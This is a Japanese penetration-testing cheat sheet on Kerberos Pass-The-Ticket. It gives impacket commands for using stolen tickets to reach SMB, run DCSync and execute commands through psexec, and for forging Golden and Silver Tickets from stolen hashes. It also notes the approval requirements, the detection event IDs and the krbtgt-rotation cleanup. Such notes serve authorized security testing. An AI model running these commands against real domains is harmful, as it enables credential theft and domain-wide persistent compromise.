# Pass-The-Ticket（PTT）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [x] 持続化に該当（Golden Ticket は krbtgt ハッシュでドメイン全体のチケットを偽造可能、デフォルト有効期限10年）
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（Event ID 4769 / 4624 Type 3、異常なチケット属性で検知）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

## 概要

Kerberos チケット（TGT または TGS）を盗み出し、それを使って対象システムへ認証する攻撃手法。NTLM ハッシュを使う Pass-The-Hash と異なり、Kerberos 認証を利用する。

---

## 着火条件

- `.ccache` 形式または `.kirbi` 形式のチケットファイルが手元にある
- DC の TGT（Unconstrained Delegation 攻撃や RBCD 後）
- DCSync 後に secretsdump で取得した krbtgt ハッシュがある（Golden Ticket 作成可能）

---

## チケットの使用方法（Linux）

### 環境変数でチケットを指定

```bash
export KRB5CCNAME=/path/to/ticket.ccache

# チケットを使って SMB アクセス
impacket-smbclient -k -no-pass [DC_FQDN]

# チケットを使って DCSync
impacket-secretsdump -k -no-pass administrator@[DC_FQDN]

# チケットを使ってコマンド実行
impacket-psexec -k -no-pass administrator@[DC_FQDN]
```

### チケットの確認

```bash
# インストールされている場合
klist

# または ccache ファイルを直接確認
python3 -c "
from impacket.krb5.ccache import CCache
cc = CCache.loadFile('/path/to/ticket.ccache')
print(cc)
"
```

---

## Golden Ticket（krbtgt ハッシュから TGT を偽造）

### 着火条件

DCSync または他の手法で `krbtgt` の NTLM ハッシュが取得できた場合。

### Golden Ticket の作成

```bash
impacket-ticketer \
  -nthash [KRBTGT_NTLM_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  Administrator
```

### ドメイン SID の取得

```bash
impacket-getPac -targetUser administrator '[DOMAIN]/[USER]:[PASSWORD]' | grep "Domain SID"
# または
impacket-lookupsid '[DOMAIN]/[USER]:[PASSWORD]@[DC_IP]' | grep "Domain SID"
```

---

## Silver Ticket（サービスアカウントハッシュから TGS を偽造）

特定のサービス（CIFS, HTTP, LDAP 等）のアカウントハッシュから、そのサービス専用の TGS を偽造する。

```bash
impacket-ticketer \
  -nthash [SERVICE_ACCOUNT_NTLM_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  -spn [SPN] \
  Administrator
```

---

## 注意点・落とし穴

- チケットには有効期限がある（TGT は通常 10 時間、TGS は通常 1 時間）
- 時刻のずれが 5 分を超えると `KRB_AP_ERR_SKEW` エラーが発生する → `sudo ntpdate [DC_IP]` で同期
- `KRB5CCNAME` のパスに `$` が含まれる場合（コンピューターアカウントのccache）はクォートが必要：
  ```bash
  export KRB5CCNAME="DC1\$@DOMAIN_krbtgt@DOMAIN.ccache"
  ```
- `-k -no-pass` オプションセットで Kerberos 認証を使用することを明示する

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。Golden Ticket は krbtgt ハッシュ取得後の追加攻撃であり、ドメイン全体に対する持続化に直結する
- **想定されるSIEM/EDR検知**:
  - Event ID 4769（Kerberos Service Ticket Operation）
  - Event ID 4624 Type 3（ネットワークログオン）
  - Golden Ticket 特有の異常（チケット有効期限がデフォルト値（10時間）から逸脱、未知のドメインユーザー名等）
- **業務影響リスク**: なし（参照のみであれば直接の業務影響はないが、krbtgt 流出が記録に残る）
- **原状回復必須項目**:
  - ✅ 偽造したチケットファイル（`.ccache` / `.kirbi`）の破棄
  - ✅ Golden Ticket は失効させるため、テスト完了後 krbtgt のパスワードを2回ローテーションする運用が必要（対象組織へ依頼）
  - ✅ 取得した krbtgt ハッシュの暗号化保管・テスト完了時破棄
- **取得情報の取扱**: krbtgt ハッシュはテスト期間中のみ暗号化保管、テスト完了時に破棄。対象組織へ返却または破棄証跡を残す
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術
- 前：`../Delegation_Attacks/Unconstrained.md`（TGT の取得）
- 前：`../Delegation_Attacks/RBCD.md`（TGS の取得・RBCD 後）
- 前：`../Credential_Dumping.md`（krbtgt ハッシュの取得）
